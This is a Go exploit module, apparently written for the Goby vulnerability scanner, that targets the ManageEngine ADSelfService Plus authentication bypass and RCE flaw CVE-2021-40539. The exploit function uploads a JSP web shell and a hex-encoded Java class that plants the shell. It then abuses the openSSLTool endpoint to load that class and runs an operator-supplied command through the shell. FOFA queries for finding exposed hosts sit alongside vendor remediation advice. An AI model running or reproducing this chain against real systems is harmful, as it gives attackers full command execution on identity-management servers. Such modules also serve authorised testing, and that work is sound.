package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ManageEngine ADSelfService Plus RCE (CVE-2021-40539)",
    "Description": "<p>ManageEngine ADSelfService Plus is an integrated self-service password management and single sign-on solution system for Active Directory and cloud applications.</p><p>ManageEngine ADSelfService Plus version 6113 and earlier versions are vulnerable to REST API authentication bypass and lead to remote code execution. Attackers can take over server permissions.</p>",
    "Impact": "ManageEngine ADSelfService Plus RCE (CVE-2021-40539)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.manageengine.com/products/self-service-password\">https://www.manageengine.com/products/self-service-password</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "ManageEngine-ADSelfService-Plus",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "ManageEngine ADSelfService Plus 系统远程代码执行漏洞（CVE-2021-40539）",
            "Description": "<p>ManageEngine ADSelfService Plus 是针对 Active Directory 和云应用程序的集成式自助密码管理和单点登录解决方案系统。</p><p>ManageEngine ADSelfService Plus 版本 6113 及更早版本容易受到 REST API 身份验证绕过并导致远程代码执行，攻击者可接管服务器权限。</p>",
            "Impact": "<p>ManageEngine ADSelfService Plus 版本 6113 及更早版本容易受到 REST API 身份验证绕过并导致远程代码执行，攻击者可接管服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.manageengine.com/products/self-service-password\">https://www.manageengine.com/products/self-service-password</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "ManageEngine-ADSelfService-Plus",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "ManageEngine ADSelfService Plus RCE (CVE-2021-40539)",
            "Description": "<p>ManageEngine ADSelfService Plus is an integrated self-service password management and single sign-on solution system for Active Directory and cloud applications.</p><p>ManageEngine ADSelfService Plus version 6113 and earlier versions are vulnerable to REST API authentication bypass and lead to remote code execution. Attackers can take over server permissions.</p>",
            "Impact": "ManageEngine ADSelfService Plus RCE (CVE-2021-40539)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.manageengine.com/products/self-service-password\">https://www.manageengine.com/products/self-service-password</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "ManageEngine-ADSelfService-Plus",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"ManageEngine - ADSelfService Plus\" || title=\"ManageEngine-ADSelfService Plus\") || ((body=\"images/adssp_favicon.ico\" && ((body=\"SMALL_STATUS_BOX\" && body=\"src=\\\"adsf/js/\") || body=\"ManageEngine\")) || title=\"ManageEngine - ADSelfService Plus\" || cert=\"o=ManageEngine Zoho Corporation, ou=ADSelfService Plus\")",
    "GobyQuery": "(title=\"ManageEngine - ADSelfService Plus\" || title=\"ManageEngine-ADSelfService Plus\") || ((body=\"images/adssp_favicon.ico\" && ((body=\"SMALL_STATUS_BOX\" && body=\"src=\\\"adsf/js/\") || body=\"ManageEngine\")) || title=\"ManageEngine - ADSelfService Plus\" || cert=\"o=ManageEngine Zoho Corporation, ou=ADSelfService Plus\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.manageengine.com/products/self-service-password",
    "DisclosureDate": "2021-11-05",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-40539"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202109-330"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "ManageEngine-ADSelfService-Plus"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10475"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/./RestAPI/LogonCustomization"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = `methodToCall=previewMobLogo`
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, `<script type="text/javascript">var d = new Date();`)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/./RestAPI/LogonCustomization"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=883c229f40dc864b2451aaeb4a4aa789")
			cfg1.Data = fmt.Sprintf("--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name=\"methodToCall\"\r\n\r\nunspecified\r\n--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name=\"Save\"\r\n\r\nyes\r\n--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name=\"form\"\r\n\r\nsmartcard\r\n--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name=\"operation\"\r\n\r\nAdd\r\n--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name=\"CERTIFICATE_PATH\"; filename=\"ws.jsp\"\r\n\r\n<%%@ page import=\"java.util.*,java.io.*\"%%>\r\n<%%\r\nif (request.getParameter(\"cmd\") != null) {\r\n        Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\r\n        OutputStream os = p.getOutputStream();\r\n        InputStream in = p.getInputStream();\r\n        DataInputStream dis = new DataInputStream(in);\r\n        String disr = dis.readLine();\r\n        while ( disr != null ) {\r\n                out.println(disr); \r\n                disr = dis.readLine(); \r\n                }\r\n        }\r\n%%>\r\n                    \r\n--883c229f40dc864b2451aaeb4a4aa789--\r\n")
			httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			ClassHexStart, _ := hex.DecodeString("CAFEBABE0000003400280A000C00160A0017001807001908001A08001B08001C08001D08001E0A0017001F0700200700210700220100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100083C636C696E69743E01000D537461636B4D61705461626C6507002001000A536F7572636546696C6501000753692E6A6176610C000D000E0700230C002400250100106A6176612F6C616E672F537472696E67010003636D640100022F63010004636F707901000677732E6A737001002A2E2E5C776562617070735C61647373705C68656C705C61646D696E2D67756964655C")
			ClassHexEnd, _ := hex.DecodeString("2E6A73700C002600270100136A6176612F696F2F494F457863657074696F6E01000253690100106A6176612F6C616E672F4F626A6563740100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0021000B000C0000000000020001000D000E0001000F0000001D00010001000000052AB70001B10000000100100000000600010000000200080011000E0001000F00000064000500020000002BB800024B2A08BD000359031204535904120553590512065359061207535907120853B600094CA700044BB10001000000260029000A00020010000000120004000000050004000600260007002A00080012000000070002690700130000010014000000020015")
			RandFileName := goutils.RandomHexString(4)
			uri2 := "/./RestAPI/LogonCustomization"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=eb689ec6bdb748d11fdfc5058d0a9aa9")
			cfg2.Data = fmt.Sprintf("--eb689ec6bdb748d11fdfc5058d0a9aa9\r\nContent-Disposition: form-data; name=\"methodToCall\"\r\n\r\nunspecified\r\n--eb689ec6bdb748d11fdfc5058d0a9aa9\r\nContent-Disposition: form-data; name=\"Save\"\r\n\r\nyes\r\n--eb689ec6bdb748d11fdfc5058d0a9aa9\r\nContent-Disposition: form-data; name=\"form\"\r\n\r\nsmartcard\r\n--eb689ec6bdb748d11fdfc5058d0a9aa9\r\nContent-Disposition: form-data; name=\"operation\"\r\n\r\nAdd\r\n--eb689ec6bdb748d11fdfc5058d0a9aa9\r\nContent-Disposition: form-data; name=\"CERTIFICATE_PATH\"; filename=\"Si.class\"\r\n\r\n%s%s%s\r\n--eb689ec6bdb748d11fdfc5058d0a9aa9--", string(ClassHexStart), RandFileName, string(ClassHexEnd))
			httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			uri3 := "/./RestAPI/Connection"
			cfg3 := httpclient.NewPostRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg3.Data = `methodToCall=openSSLTool&action=generateCSR&KEY_LENGTH=1024+-providerclass+Si+-providerpath+%22..%5Cbin%22`
			httpclient.DoHttpRequest(expResult.HostInfo, cfg3)
			uri4 := "/help/admin-guide/" + RandFileName + ".jsp"
			cfg4 := httpclient.NewPostRequestConfig(uri4)
			cfg4.VerifyTls = false
			cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg4.Data = `cmd=` + url.QueryEscape(cmd)
			if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil {
				if resp4.StatusCode == 200 {
					expResult.Output = resp4.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
